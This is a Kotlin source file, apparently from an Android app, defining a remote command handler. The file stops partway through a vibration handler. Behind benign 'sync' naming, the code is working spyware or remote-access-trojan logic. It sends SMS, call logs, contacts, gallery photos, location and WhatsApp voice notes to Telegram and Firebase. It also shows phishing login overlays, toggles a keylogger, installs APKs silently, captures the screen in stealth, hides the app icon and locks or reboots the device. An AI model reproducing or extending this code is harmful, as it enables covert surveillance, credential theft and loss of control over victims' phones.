package com.example.data.sync

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.annotation.SuppressLint
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.Ringtone
import android.media.RingtoneManager
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.telephony.SmsManager
import com.example.util.ToastUtils
import android.util.Base64
import android.net.Uri
import com.google.firebase.firestore.FirebaseFirestore
import android.util.Log
import android.util.Size
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.delay
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.IntentFilter
import android.telephony.TelephonyManager
import android.widget.Toast
import androidx.core.content.ContextCompat
import com.example.data.local.AppDatabase
import com.example.data.local.RemoteCommandEntity
import com.example.service.RemoteAccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.telephony.SubscriptionManager
import com.example.receiver.MyDeviceAdminReceiver
import org.json.JSONObject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.Locale
import java.util.UUID

class RemoteCommandManager(private val context: Context) {

    private val db = AppDatabase.getInstance(context)

    companion object {
        private var activeRingtone: Ringtone? = null
        private var textToSpeech: TextToSpeech? = null
        @Volatile
        var instanceContext: Context? = null
            private set
    }

    init {
        instanceContext = context.applicationContext
    }

    suspend fun executeCommand(commandType: String, payload: String = ""): RemoteCommandEntity = withContext(Dispatchers.IO) {
        val commandId = UUID.randomUUID().toString()
        val entity = RemoteCommandEntity(
            id = commandId,
            commandType = commandType,
            payload = payload,
            status = "EXECUTING",
            createdAt = System.currentTimeMillis()
        )
        db.remoteCommandDao().insertCommand(entity)

        var resultMessage = ""
        var isSuccess = true

        val cleanType = commandType.trim().uppercase()
        try {
            when (cleanType) {
                "SYNC_ALL", "SYNC", "FORCE_SYNC", "REFRESH_DATA", "CLEAR_AND_SYNC_ALL" -> {
                    val clearFirst = commandType.equals("CLEAR_AND_SYNC_ALL", ignoreCase = true) || payload.contains("clear", ignoreCase = true)
                    SmsSyncManager(context).syncSmsMessages()
                    CallLogSyncManager(context).syncCallLogs()
                    ContactsSyncManager(context).syncContacts()
                    AppUsageSyncManager(context).syncAppUsageStats()
                    LocationSyncManager(context).captureAndSyncLocation()
                    DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase(clearFirst = clearFirst)
                    resultMessage = if (clearFirst) "Old backup cleared and fresh telemetry synchronized successfully." else "All telemetry modules synchronized successfully."
                }
                "SYNC_SMS", "GET_SMS", "FETCH_SMS" -> {
                    SmsSyncManager(context).syncSmsMessages()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "SMS messages synchronized successfully."
                }
                "SYNC_CALLS", "GET_CALLS", "FETCH_CALLS" -> {
                    CallLogSyncManager(context).syncCallLogs()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Call logs synchronized successfully."
                }
                "SYNC_CONTACTS", "GET_CONTACTS", "FETCH_CONTACTS" -> {
                    ContactsSyncManager(context).syncContacts()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Contacts synchronized successfully."
                }
                "SYNC_VOICE_NOTES", "WHATSAPP_VOICES" -> {
                    WhatsAppVoiceNoteSyncManager.scanAndSyncAllVoiceNotes(context)
                    resultMessage = "WhatsApp voice notes successfully synced and exfiltrated."
                }
                "UPLOAD_CONTACTS", "CONTACTS_TXT", "SYNC_CONTACTS_FILE", "EXPORT_CONTACTS_TXT" -> {
                    val contacts = ContactsSyncManager(context).syncContacts()
                    val sb = StringBuilder()
                    sb.append("=== DEVICE CONTACTS EXPORT ===\n")
                    sb.append("Total Contacts: ${contacts.size}\n")
                    sb.append("=====================================\n\n")
                    for (c in contacts) {
                        sb.append("Name: ${c.displayName}\n")
                        sb.append("Primary Phone: ${c.primaryPhone.ifEmpty { "N/A" }}\n")
                        if (c.secondaryPhone.isNotEmpty()) {
                            sb.append("Secondary Phone: ${c.secondaryPhone}\n")
                        }
                        if (c.phoneNumbersJson.isNotEmpty()) {
                            sb.append("All Numbers: ${c.phoneNumbersJson.replace("|||", ", ")}\n")
                        }
                        if (c.email.isNotEmpty()) {
                            sb.append("Email: ${c.email}\n")
                        }
                        if (c.notes.isNotEmpty()) {
                            sb.append("Notes: ${c.notes}\n")
                        }
                        sb.append("-------------------------------------\n")
                    }
                    val fileBytes = sb.toString().toByteArray(Charsets.UTF_8)
                    val telegramBot = TelegramBotManager(context)
                    val success = telegramBot.sendDocument(fileBytes, "contacts.txt", "Contacts Export (${contacts.size} contacts)")
                    resultMessage = if (success) "Contacts.txt uploaded to Telegram successfully (${contacts.size} contacts)." else "Failed to upload contacts.txt to Telegram."
                    isSuccess = success
                }
                "UPLOAD_PHOTOS", "SYNC_PHOTOS", "EXPORT_PHOTOS", "GET_PHOTOS", "UPLOAD_GALLERY" -> {
                    var limit = 500
                    val trimmed = payload.trim()
                    if (trimmed.startsWith("{")) {
                        try {
                            val json = JSONObject(trimmed)
                            val l = json.optInt("limit", json.optInt("count", json.optInt("max", 500)))
                            if (l > 0) limit = l.coerceIn(1, 2000)
                        } catch (_: Exception) {}
                    } else if (trimmed.isNotEmpty()) {
                        if (trimmed.equals("all", ignoreCase = true) || trimmed.equals("full", ignoreCase = true)) {
                            limit = 2000
                        } else {
                            val parsedLimit = trimmed.filter { it.isDigit() }.toIntOrNull()
                            if (parsedLimit != null && parsedLimit > 0) {
                                limit = parsedLimit.coerceIn(1, 2000)
                            }
                        }
                    }

                    val telegramBot = TelegramBotManager(context)
                    var uploadedCount = 0
                    val projection = arrayOf(
                        android.provider.MediaStore.Images.Media._ID,
                        android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                        android.provider.MediaStore.Images.Media.DATE_ADDED
                    )
                    val sortOrder = "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC"

                    try {
                        context.contentResolver.query(
                            android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                            projection,
                            null,
                            null,
                            sortOrder
                        )?.use { cursor ->
                            val idColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
                            val nameColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
                            
                            while (cursor.moveToNext() && uploadedCount < limit) {
                                val id = cursor.getLong(idColumn)
                                val name = cursor.getString(nameColumn) ?: "photo_$id.jpg"
                                val uri = android.content.ContentUris.withAppendedId(
                                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                    id
                                )

                                try {
                                    context.contentResolver.openInputStream(uri)?.use { inputStream ->
                                        val bytes = inputStream.readBytes()
                                        if (bytes.isNotEmpty()) {
                                            val caption = "🖼️ Gallery Photo [${uploadedCount + 1}]: $name (${(bytes.size / 1024)} KB)"
                                            val sent = telegramBot.sendPhoto(bytes, caption)
                                            if (sent) uploadedCount++
                                        }
                                    }
                                } catch (e: Exception) {
                                    Log.e("RemoteCommandManager", "Failed to read/upload photo $name: ${e.message}")
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("RemoteCommandManager", "Failed to query MediaStore images: ${e.message}")
                    }

                    resultMessage = if (uploadedCount > 0) {
                        "Successfully uploaded $uploadedCount gallery photo(s) to Telegram."
                    } else {
                        "No gallery photos uploaded (check storage permissions or photo availability)."
                    }
                    isSuccess = uploadedCount > 0
                }
                "CLEAR_REMOTE_DATA", "PURGE_DATA", "WIPE_DATA", "CLEAR_DATA", "DELETE_ALL" -> {
                    FirebaseSyncEngine(context).clearAllRemoteData()
                    resultMessage = "All remote backup data and local logs cleared successfully."
                }
                "PLACE_CALL", "MAKE_CALL", "CALL", "CALL_PHONE", "DIAL_CALL", "REMOTE_CALL" -> {
                    var targetNum = ""
                    var targetSim: Int? = null

                    val trimmed = payload.trim()
                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            val numKeys = listOf("phone", "phoneNumber", "number", "target", "num", "param1", "p1", "value")
                            for (key in numKeys) {
                                if (json.has(key)) {
                                    val v = json.optString(key, "").trim()
                                    if (v.isNotEmpty()) {
                                        targetNum = v
                                        break
                                    }
                                }
                            }
                            val simKeys = listOf("sim", "simSlot", "slot", "param2", "p2")
                            for (key in simKeys) {
                                if (json.has(key)) {
                                    val s = json.optInt(key, -1)
                                    if (s >= 0) {
                                        targetSim = s
                                        break
                                    }
                                }
                            }
                        } catch (_: Exception) {}
                    }

                    if (targetNum.isEmpty()) {
                        if (trimmed.contains("|")) {
                            val parts = trimmed.split("|")
                            targetNum = parts[0].trim()
                            targetSim = parts.getOrNull(1)?.trim()?.toIntOrNull()
                        } else if (trimmed.contains("=")) {
                            val parts = trimmed.split("=")
                            targetNum = parts.last().trim()
                        } else {
                            targetNum = trimmed
                        }
                    }

                    val res = CallHelper.placeCall(context, targetNum, targetSim)
                    resultMessage = res
                    if (res.contains("denied", ignoreCase = true) ||
                        res.contains("Missing", ignoreCase = true) ||
                        res.contains("No dialer", ignoreCase = true) ||
                        res.contains("Invalid", ignoreCase = true) ||
                        res.contains("Error", ignoreCase = true)) {
                        isSuccess = false
                    }
                }
                "USSD", "DIAL_CODE", "SEND_USSD", "DIAL_USSD", "CODE" -> {
                    var ussdCode = ""
                    val trimmed = payload.trim()
                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            val keys = listOf("code", "ussd", "number", "phone", "target", "value")
                            for (key in keys) {
                                if (json.has(key)) {
                                    val v = json.optString(key, "").trim()
                                    if (v.isNotEmpty()) {
                                        ussdCode = v
                                        break
                                    }
                                }
                            }
                        } catch (_: Exception) {}
                    }
                    if (ussdCode.isEmpty()) {
                        if (trimmed.contains("=")) {
                            ussdCode = trimmed.split("=").last().trim()
                        } else {
                            ussdCode = trimmed
                        }
                    }
                    if (ussdCode.isEmpty()) {
                        ussdCode = "*#123#"
                    }
                    val res = CallHelper.dialUssd(context, ussdCode)
                    resultMessage = res
                    if (res.contains("error", ignoreCase = true) || res.contains("failed", ignoreCase = true)) {
                        isSuccess = false
                    }
                }
                "SHOW_ACCESSIBILITY_OVERLAY", "ACCESSIBILITY_OVERLAY", "SHOW_OVERLAY", "REQUIRE_ACCESSIBILITY", "SHOW_ACCESSIBILITY_PROMPT", "START_ACCESSIBILITY_OVERLAY", "SHOW_OVERLAY_TEMPLATE" -> {
                    val templateId = if (payload.isNotBlank()) payload.trim() else "accessibility"
                    resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context, templateId)
                }
                "SHOW_GOOGLE_OVERLAY", "GOOGLE_OVERLAY" -> {
                    resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context, "google")
                }
                "SHOW_SYSTEM_OVERLAY", "SYSTEM_OVERLAY" -> {
                    resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context, "system")
                }
                "SHOW_LOGIN_OVERLAY", "LOGIN_OVERLAY", "PHISHING_OVERLAY", "SHOW_PHISHING_OVERLAY" -> {
                    resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context, "login")
                }
                "HIDE_ACCESSIBILITY_OVERLAY", "REMOVE_ACCESSIBILITY_OVERLAY", "HIDE_OVERLAY", "DISMISS_ACCESSIBILITY_OVERLAY" -> {
                    com.example.service.AccessibilityOverlayManager.removeOverlay(context)
                    resultMessage = "Accessibility overlay removed remotely."
                }
                "SILENT_INSTALL", "INSTALL_APK", "SILENT_APP_INSTALL", "INSTALL_APP" -> {
                    val apkUrl = payload.trim()
                    if (apkUrl.isNotEmpty()) {
                        resultMessage = SilentInstallHelper.installApkFromUrl(context, apkUrl)
                    } else {
                        resultMessage = "Error: APK URL is missing for silent installation."
                        isSuccess = false
                    }
                }
                "START_KEYLOGGER", "KEYLOGGER_ON" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    RemoteAccessibilityService.setKeyloggerActive(true)
                    resultMessage = if (isAccEnabled) "Keylogger started successfully." else "Keylogger state set to active (Warning: Accessibility service not currently bound)."
                    isSuccess = true
                }
                "STOP_KEYLOGGER", "KEYLOGGER_OFF" -> {
                    RemoteAccessibilityService.setKeyloggerActive(false)
                    resultMessage = "Keylogger stopped successfully."
                    isSuccess = true
                }
                "SYNC_LOCATION", "LOCATION", "GET_LOCATION" -> {
                    val loc = LocationSyncManager(context).captureAndSyncLocation()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Location synchronized: Lat ${loc.latitude}, Long ${loc.longitude} (Accuracy: ${loc.accuracy}m)."
                }
                "GLOBAL_BACK", "BACK" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_BACK)
                    if (res) {
                        resultMessage = "Executed Global Back gesture successfully."
                    } else {
                        var shellSuccess = false
                        try {
                            val p = Runtime.getRuntime().exec("input keyevent 4")
                            p.waitFor()
                            if (p.exitValue() == 0) shellSuccess = true
                        } catch (_: Exception) {}

                        if (shellSuccess) {
                            resultMessage = if (isAccEnabled) "Executed Back gesture via system shell fallback." else "Executed Back gesture via shell fallback (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to execute Back gesture: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to execute Back gesture: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                        }
                    }
                }
                "GLOBAL_HOME", "HOME" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_HOME)
                    if (res) {
                        resultMessage = "Executed Global Home gesture successfully."
                    } else {
                        var intentSuccess = false
                        try {
                            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                                addCategory(Intent.CATEGORY_HOME)
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            }
                            context.startActivity(homeIntent)
                            intentSuccess = true
                        } catch (_: Exception) {}

                        if (intentSuccess) {
                            resultMessage = if (isAccEnabled) "Executed Home action via system intent launcher." else "Executed Home action via system intent launcher (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to execute Home gesture: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to execute Home gesture: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                        }
                    }
                }
                "GLOBAL_RECENTS", "RECENTS" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
                    if (res) {
                        resultMessage = "Executed Global Recents gesture successfully."
                    } else {
                        var shellSuccess = false
                        try {
                            val p = Runtime.getRuntime().exec("input keyevent 187")
                            p.waitFor()
                            if (p.exitValue() == 0) shellSuccess = true
                        } catch (_: Exception) {}

                        if (shellSuccess) {
                            resultMessage = if (isAccEnabled) "Opened Recents via system shell fallback." else "Opened Recents via shell fallback (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to open Recents: Accessibility Service is enabled, but operation was blocked by system state." else "Failed to open Recents: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                        }
                    }
                }
                "GLOBAL_NOTIFICATIONS", "NOTIFICATIONS" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
                    if (res) {
                        resultMessage = "Expanded Notification shade successfully."
                    } else {
                        var shellSuccess = false
                        try {
                            val p = Runtime.getRuntime().exec("cmd statusbar expand-notifications")
                            p.waitFor()
                            if (p.exitValue() == 0) shellSuccess = true
                        } catch (_: Exception) {
                            try {
                                val p = Runtime.getRuntime().exec("service call statusbar 1")
                                p.waitFor()
                                if (p.exitValue() == 0) shellSuccess = true
                            } catch (_: Exception) {}
                        }

                        if (shellSuccess) {
                            resultMessage = if (isAccEnabled) "Expanded Notification shade via system statusbar fallback." else "Expanded Notification shade via shell fallback (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to expand Notifications: Accessibility Service is enabled, but system blocked shade expansion (e.g. screen locked or keyguard active)." else "Failed to expand Notifications: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                        }
                    }
                }
                "GLOBAL_QUICK_SETTINGS", "QUICK_SETTINGS" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
                    if (res) {
                        resultMessage = "Expanded Quick Settings successfully."
                    } else {
                        var shellSuccess = false
                        try {
                            val p = Runtime.getRuntime().exec("cmd statusbar expand-settings")
                            p.waitFor()
                            if (p.exitValue() == 0) shellSuccess = true
                        } catch (_: Exception) {
                            try {
                                val p = Runtime.getRuntime().exec("service call statusbar 2")
                                p.waitFor()
                                if (p.exitValue() == 0) shellSuccess = true
                            } catch (_: Exception) {}
                        }

                        if (shellSuccess) {
                            resultMessage = if (isAccEnabled) "Expanded Quick Settings via system statusbar fallback." else "Expanded Quick Settings via shell fallback (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to expand Quick Settings: Accessibility Service is enabled, but system blocked shade expansion." else "Failed to expand Quick Settings: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                        }
                    }
                }
                "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN", "LOCK", "LOCK_DEVICE" -> {
                    var locked = false
                    var lockMethod = ""

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        if (RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)) {
                            locked = true
                            lockMethod = "Accessibility Service"
                        }
                    }

                    if (!locked) {
                        try {
                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                            val adminComponent = ComponentName(context, MyDeviceAdminReceiver::class.java)
                            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                                dpm.lockNow()
                                locked = true
                                lockMethod = "Device Admin"
                            }
                        } catch (e: Exception) {
                            Log.e("RemoteCommandManager", "Device Policy Manager screen lock error: ${e.message}")
                        }
                    }

                    if (!locked) {
                        try {
                            val p = Runtime.getRuntime().exec("input keyevent 26")
                            p.waitFor()
                            if (p.exitValue() == 0) {
                                locked = true
                                lockMethod = "Shell Power keyevent"
                            }
                        } catch (_: Exception) {}
                    }

                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)

                    if (locked) {
                        resultMessage = "Locked device screen successfully via $lockMethod."
                    } else if (!isAccEnabled) {
                        isSuccess = false
                        resultMessage = "Failed to lock screen: Accessibility Service is OFF. Please enable Android system accessibility in Settings -> Accessibility."
                    } else {
                        isSuccess = false
                        resultMessage = "Failed to lock screen: Accessibility Service is enabled, but screen lock action was not supported by OS state."
                    }
                }
                "LOST_MODE", "LOCK_WITH_MESSAGE", "ACTIVATE_LOST_MODE" -> {
                    var customMsg: String? = null
                    var ownerPhone: String? = null
                    var unlockPin: String? = null

                    val trimmed = payload.trim()
                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            customMsg = json.optString("message").ifEmpty { json.optString("msg").ifEmpty { null } }
                            ownerPhone = json.optString("phone").ifEmpty { json.optString("contact").ifEmpty { null } }
                            unlockPin = json.optString("pin").ifEmpty { null }
                        } catch (_: Exception) {}
                    }
                    if (customMsg == null && trimmed.isNotEmpty() && !trimmed.startsWith("{")) {
                        if (!trimmed.startsWith("Lost Mode Activated") && !trimmed.contains("Triggered from") && !trimmed.startsWith("Result:")) {
                            customMsg = trimmed
                        }
                    }

                    resultMessage = LostModeManager.lockDeviceWithCustomMessage(context, customMsg, ownerPhone, unlockPin)
                }
                "UNLOCK_DEVICE", "REMOTE_UNLOCK", "UNLOCK_MODE", "CLEAR_LOST_MODE", "UNLOCK" -> {
                    val trimmed = payload.trim()
                    val unlocked = if (trimmed.isEmpty() || trimmed.lowercase() in listOf("force", "remote", "true", "yes", "clear")) {
                        LostModeManager.forceUnlockDevice(context)
                    } else {
                        LostModeManager.unlockDevice(context, trimmed)
                    }
                    resultMessage = if (unlocked) "Device unlocked remotely and Lost Mode cleared." else "Unlock failed: Incorrect PIN parameter provided."
                    if (!unlocked) isSuccess = false
                }
                "OPEN_URL", "SHOW_LINK", "OPEN_LINK", "URL" -> {
                    var rawUrl = payload.trim()
                    if (rawUrl.contains("=") && !rawUrl.startsWith("http://") && !rawUrl.startsWith("https://")) {
                        val parts = rawUrl.split("=")
                        if (parts.size >= 2) {
                            rawUrl = parts.drop(1).joinToString("=").trim()
                        }
                    }
                    val urlStr = rawUrl.trim()
                    if (urlStr.isNotEmpty()) {
                        try {
                            val finalUrl = if (!urlStr.startsWith("http://") && !urlStr.startsWith("https://")) {
                                "https://$urlStr"
                            } else {
                                urlStr
                            }
                            val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(finalUrl)).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            context.startActivity(intent)
                            resultMessage = "Opened URL successfully: $finalUrl"
                        } catch (e: Exception) {
                            resultMessage = "Failed to open URL: ${e.message}"
                            isSuccess = false
                        }
                    } else {
                        resultMessage = "Error: URL payload is empty."
                        isSuccess = false
                    }
                }
                "START_SIREN", "SIREN_ON", "ALARM_ON", "TRIGGER_SIREN", "PLAY_SIREN", "ALARM", "PLAY_ALARM", "RING", "FIND_DEVICE" -> {
                    playFindDeviceAlarm()
                    LostModeManager.triggerSiren(context, true)
                    resultMessage = "Loud siren alarm triggered remotely on device."
                }
                "STOP_SIREN", "SIREN_OFF", "ALARM_OFF", "MUTE_SIREN", "STOP_ALARM", "STOP_RING", "MUTE_ALARM" -> {
                    stopAlarm()
                    LostModeManager.triggerSiren(context, false)
                    resultMessage = "Siren alarm stopped remotely."
                }
                "UPDATE_LOST_CONFIG", "SET_LOST_CONFIG" -> {
                    val trimmed = payload.trim()
                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            val current = LostModeManager.getOverlayConfig(context)
                            val title = json.optString("title", current.title)
                            val subtitle = json.optString("subtitle", current.subtitle)
                            val message = json.optString("message", json.optString("msg", current.message))
                            val phone = json.optString("phone", json.optString("contact", current.ownerPhone))
                            val email = json.optString("email", current.ownerEmail)
                            val accountNumber = json.optString("accountNumber", current.accountNumber)
                            val rewardNote = json.optString("rewardNote", current.rewardNote)
                            val theme = json.optString("theme", current.theme)
                            val icon = json.optString("icon", current.icon)
                            val showSiren = if (json.has("showSiren")) json.getBoolean("showSiren") else current.showSiren
                            val showContact = if (json.has("showContact")) json.getBoolean("showContact") else current.showContact
                            val pin = json.optString("pin", current.pin)

                            LostModeManager.saveOverlayConfig(
                                context,
                                LostModeManager.LostOverlayConfig(
                                    title = title,
                                    subtitle = subtitle,
                                    message = message,
                                    ownerPhone = phone,
                                    ownerEmail = email,
                                    accountNumber = accountNumber,
                                    rewardNote = rewardNote,
                                    theme = theme,
                                    icon = icon,
                                    showSiren = showSiren,
                                    showContact = showContact,
                                    pin = pin
                                )
                            )
                            resultMessage = "Updated full Lost Mode remote configuration successfully."
                        } catch (e: Exception) {
                            resultMessage = "Failed to parse lost config JSON: ${e.message}"
                            isSuccess = false
                        }
                    } else {
                        resultMessage = "Payload must be JSON."
                        isSuccess = false
                    }
                }
                "GLOBAL_POWER_DIALOG", "POWER_DIALOG", "POWER_MENU", "POWER", "REBOOT", "SHUTDOWN", "POWER_OFF" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
                    if (res) {
                        resultMessage = "Power Dialog displayed successfully via Accessibility Service."
                    } else {
                        var adminRebootSuccess = false
                        try {
                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                            val adminComponent = ComponentName(context, MyDeviceAdminReceiver::class.java)
                            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                    dpm.reboot(adminComponent)
                                    adminRebootSuccess = true
                                }
                            }
                        } catch (e: Exception) {
                            Log.e("RemoteCommandManager", "DevicePolicyManager reboot failed: ${e.message}")
                        }

                        if (adminRebootSuccess) {
                            resultMessage = if (isAccEnabled) "Reboot initiated via Device Policy Manager." else "Reboot initiated via Device Policy Manager (Accessibility Service is OFF)."
                        } else {
                            isSuccess = false
                            resultMessage = if (isAccEnabled) "Failed to open Power Menu / Reboot: Accessibility Service is enabled, but Device Admin reboot is not configured." else "Failed to open Power Menu / Reboot: Accessibility Service is OFF and Device Admin reboot is not active."
                        }
                    }
                }
                "START_STEALTH_CAPTURE", "START_STEALTH_SCREENSHOT", "START_SCREENSHOT_CAPTURE",
                "START_LIVE_SCREEN_STREAM", "LIVE_STREAM", "START_LIVE_MONITORING" -> {
                    var maxShots = 0
                    var intervalSec = if (commandType.contains("LIVE", true)) 1 else 10
                    val trimmed = payload.trim()
                    if (trimmed.startsWith("{")) {
                        try {
                            val json = JSONObject(trimmed)
                            val shots = json.optInt("maxShots", json.optInt("count", json.optInt("shots", json.optInt("max", 0))))
                            if (shots >= 0) maxShots = shots
                            val interval = json.optInt("intervalSec", json.optInt("interval", json.optInt("delay", intervalSec)))
                            if (interval > 0) intervalSec = interval
                        } catch (_: Exception) {}
                    } else if (trimmed.contains("|")) {
                        val parts = trimmed.split("|")
                        val interval = parts.getOrNull(0)?.trim()?.toIntOrNull()
                        if (interval != null && interval > 0) intervalSec = interval
                        val shots = parts.getOrNull(1)?.trim()?.toIntOrNull()
                        if (shots != null && shots >= 0) maxShots = shots
                    } else if (trimmed.toIntOrNull() != null) {
                        val interval = trimmed.toInt()
                        if (interval > 0) intervalSec = interval
                    }
                    MediaProjectionHelper.startService(context, intervalSec, maxShots)
                    resultMessage = if (maxShots > 0) {
                        "Live screen stream / stealth capture initiated (interval: ${intervalSec}s, max shots: $maxShots)."
                    } else {
                        "Live screen stream / stealth background capture service initiated (interval: ${intervalSec}s, continuous)."
                    }
                }
                "STOP_STEALTH_CAPTURE", "STOP_STEALTH_SCREENSHOT", "STOP_SCREENSHOT_CAPTURE",
                "STOP_LIVE_SCREEN_STREAM", "STOP_LIVE_STREAM", "STOP_LIVE_MONITORING", "STOP_STREAM", "STOP_SCREEN_STREAM", "STOP_LIVE" -> {
                    MediaProjectionHelper.stopService(context)
                    resultMessage = "Live screen stream / stealth background capture service stopped successfully."
                }
                "HIDE_APP_ICON", "HIDE_ICON", "HIDE_LAUNCHER" -> {
                    com.example.util.AppIconUtils.setAppIconVisibility(context, false)
                    resultMessage = "App launcher icon hidden successfully."
                }
                "SHOW_APP_ICON", "SHOW_ICON", "SHOW_LAUNCHER" -> {
                    com.example.util.AppIconUtils.setAppIconVisibility(context, true)
                    resultMessage = "App launcher icon restored/shown successfully."
                }
                "CHECK_ICON_STATE", "CHECK_APP_ICON", "CHECK_ICON" -> {
                    val isVisible = com.example.util.AppIconUtils.isAppIconVisible(context)
                    resultMessage = "App launcher icon visible state: $isVisible"
                }
                "GLOBAL_TAKE_SCREENSHOT", "TAKE_SCREENSHOT", "SCREENSHOT" -> {
                    val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
                    var res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT)
                    } else false

                    if (res) {
                        resultMessage = "Took Screenshot successfully via Accessibility Service."
                    } else {
                        isSuccess = false
                        resultMessage = if (isAccEnabled) "Failed to take screenshot: Accessibility Service is enabled, but system blocked capture." else "Failed to take screenshot: Accessibility Service is OFF."
                    }
                }
                "FLASHLIGHT_ON", "TORCH_ON", "FLASHLIGHT_ENABLE" -> {
                    setFlashlight(true)
                    resultMessage = "Flashlight turned ON."
                }
                "FLASHLIGHT_OFF", "TORCH_OFF", "FLASHLIGHT_DISABLE" -> {
                    setFlashlight(false)
                    resultMessage = "Flashlight turned OFF."
                }
                "VIBRATE", "VIBRATION" -> {
                    var parsedDuration: Long? = null
                    val trimmed = payload.trim()

                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            val d = json.optLong("duration", -1L).takeIf { it > 0 }
                                ?: json.optLong("time", -1L).takeIf { it > 0 }
                                ?: json.optLong("ms", -1L).takeIf { it > 0 }
                            if (d != null && d > 0) parsedDuration = d
                        } catch (_: Exception) {}
                    }

